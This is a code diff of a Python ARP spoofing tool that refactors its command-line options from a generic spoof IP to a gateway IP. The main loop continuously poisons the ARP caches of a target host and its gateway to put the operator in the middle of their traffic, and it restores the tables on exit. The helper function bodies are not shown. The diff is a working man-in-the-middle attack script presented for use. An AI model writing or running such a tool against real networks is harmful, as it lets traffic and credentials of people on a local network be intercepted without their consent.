@@ -7,13 +7,13 @@ import optparse
 
 def get_arguments():
     parser = optparse.OptionParser()
-    parser.add_option("-t", "--target", dest="target_ip", help="Target IP / IP range.")
-    parser.add_option("-s", "--spoof", dest="spoof_ip", help="Spoof IP / IP range.")
+    parser.add_option("-t", "--target-ip", dest="target_ip", help="Target IP for spoofing gateway.")
+    parser.add_option("-g", "--gateway-ip", dest="gateway_ip", help="Gateway IP for spoofing Target.")
     (options, argument) = parser.parse_args()
     if not options.target_ip:
         parser.error("[-] Please specify an target_ip, use --help for more info.")
-    elif not options.spoof_ip:
-        parser.error("[-] Please specify an spoof_ip, use --help for more info.")
+    elif not options.gateway_ip:
+        parser.error("[-] Please specify an gateway_ip, use --help for more info.")
     return options
 
 def get_mac(ip):
@@ -40,13 +40,13 @@ options = get_arguments()
 sent_packet_count = 0
 try:
     while True:
-        spoof(options.target_ip, options.spoof_ip)
-        spoof(options.spoof_ip, options.target_ip)
+        spoof(options.target_ip, options.gateway_ip)
+        spoof(options.gateway_ip, options.target_ip)
         sent_packet_count += 2
         print("\r[+] Packets sent: " + str(sent_packet_count)),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[+] Detected CTRL + C ....... Resetting ARP tables...... Please wait.\n")
-    restore(options.target_ip, options.spoof_ip)
-    restore(options.spoof_ip, options.target_ip)
+    restore(options.target_ip, options.gateway_ip)
+    restore(options.gateway_ip, options.target_ip)
